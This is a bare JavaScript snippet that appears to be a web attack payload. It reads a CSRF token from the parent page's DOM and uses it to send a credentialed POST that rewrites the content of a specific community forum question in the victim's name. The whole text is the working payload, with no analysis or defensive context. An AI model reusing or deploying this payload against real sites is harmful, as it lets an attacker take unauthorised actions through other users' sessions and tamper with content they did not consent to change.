const tok = window.parent.document.querySelector('input#csrftoken').value;
fetch('/community/api/questions/180649/editContent',{method:'POST',credentials:'include',headers:{'X-Requested-With':'XMLHttpRequest','X-CSRF-TOKEN':tok,'Content-Type':'application/json'},body:'{"content":"<p>such a nice community to help with doubts</p>"}'})
